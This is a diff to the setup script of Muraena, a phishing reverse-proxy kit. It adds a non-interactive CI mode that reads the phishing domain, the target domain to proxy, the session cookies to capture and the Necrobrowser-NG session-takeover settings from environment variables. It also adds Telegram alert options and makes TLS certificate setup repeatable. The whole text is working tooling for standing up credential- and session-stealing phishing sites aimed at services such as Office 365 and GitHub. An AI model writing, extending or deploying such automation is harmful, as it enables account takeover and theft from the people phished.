@@ -4,7 +4,25 @@ set -euo pipefail
 # ─────────────────────────────────────────────────────────────────────────────
 # Muraena — plug-and-play setup script
 # Generates config, handles TLS, wires Necrobrowser-NG, starts everything.
+#
+# Interactive:       ./setup.sh
+# Non-interactive:   ./setup.sh --ci   (reads from environment variables)
+#
+# CI environment variables:
+#   MURAENA_PHISHING_DOMAIN   required  your phishing domain
+#   MURAENA_TARGET_DOMAIN     required  domain to proxy
+#   MURAENA_TLS_MODE          1=letsencrypt  2=self-signed  3=none (default: 3)
+#   MURAENA_TRACKING          true/false (default: true)
+#   MURAENA_SESSION_MODE      1=store-only  2=necro-docker  3=necro-external (default: 1)
+#   MURAENA_NECRO_ENDPOINT    required when SESSION_MODE=3
+#   MURAENA_NECRO_COOKIES     comma-separated trigger cookie names (default: sessionToken)
+#   MURAENA_NECRO_TASK_TYPE   e.g. office365, github, generic (default: generic)
+#   MURAENA_TELEGRAM_TOKEN    optional
+#   MURAENA_TELEGRAM_CHAT_ID  optional
 # ─────────────────────────────────────────────────────────────────────────────
+
+CI_MODE=false
+[[ "${1:-}" == "--ci" ]] && CI_MODE=true
 
 BOLD="\033[1m"
 GREEN="\033[32m"
@@ -40,6 +58,38 @@ check_deps() {
 # ── gather config ─────────────────────────────────────────────────────────────
 
 gather_config() {
+    if [[ "$CI_MODE" == true ]]; then
+        # ── non-interactive: read from environment variables ──────────────────
+        PHISHING_DOMAIN="${MURAENA_PHISHING_DOMAIN:?MURAENA_PHISHING_DOMAIN must be set}"
+        TARGET_DOMAIN="${MURAENA_TARGET_DOMAIN:?MURAENA_TARGET_DOMAIN must be set}"
+        TLS_CHOICE="${MURAENA_TLS_MODE:-3}"
+        TRACKING_CHOICE="${MURAENA_TRACKING:-Y}"
+        SESSION_MODE="${MURAENA_SESSION_MODE:-1}"
+        NECRO_COOKIES="${MURAENA_NECRO_COOKIES:-sessionToken}"
+        NECRO_TASK_TYPE="${MURAENA_NECRO_TASK_TYPE:-generic}"
+        TG_TOKEN="${MURAENA_TELEGRAM_TOKEN:-}"
+        TG_CHAT_ID="${MURAENA_TELEGRAM_CHAT_ID:-}"
+
+        if [[ "$SESSION_MODE" == "2" ]]; then
+            NECRO_ENDPOINT="http://necrobrowser:3000/instrument"
+        elif [[ "$SESSION_MODE" == "3" ]]; then
+            NECRO_ENDPOINT="${MURAENA_NECRO_ENDPOINT:?MURAENA_NECRO_ENDPOINT must be set when SESSION_MODE=3}"
+        fi
+
+        if [[ -n "$TG_TOKEN" && -n "$TG_CHAT_ID" ]]; then
+            TG_CHOICE="Y"
+        else
+            TG_CHOICE="N"
+        fi
+
+        info "CI mode — config loaded from environment variables."
+        info "  Domain   : ${PHISHING_DOMAIN} → ${TARGET_DOMAIN}"
+        info "  TLS mode : ${TLS_CHOICE}"
+        info "  Sessions : ${SESSION_MODE}"
+        return
+    fi
+
+    # ── interactive prompts ───────────────────────────────────────────────────
     section "Core Configuration"
 
     ask "Phishing domain (e.g. evil.example.com):"
@@ -110,6 +160,11 @@ gather_config() {
 # ── TLS setup ─────────────────────────────────────────────────────────────────
 
 setup_tls_letsencrypt() {
+    # Skip if certs already exist (idempotent for CI re-runs)
+    if [[ -f config/cert.pem && -f config/privkey.pem ]]; then
+        info "TLS certificates already present — skipping Let's Encrypt request."
+        return
+    fi
     command -v certbot &>/dev/null || {
         warn "certbot not found — installing via snap..."
         snap install --classic certbot && ln -sf /snap/bin/certbot /usr/bin/certbot
@@ -125,6 +180,11 @@ setup_tls_letsencrypt() {
 }
 
 setup_tls_selfsigned() {
+    # Skip if certs already exist (idempotent for CI re-runs)
+    if [[ -f config/cert.pem && -f config/privkey.pem ]]; then
+        info "TLS certificates already present — skipping self-signed generation."
+        return
+    fi
     info "Generating self-signed certificate for ${PHISHING_DOMAIN}..."
     openssl req -x509 -newkey rsa:4096 -sha256 -days 365 -nodes \
         -keyout config/privkey.pem \
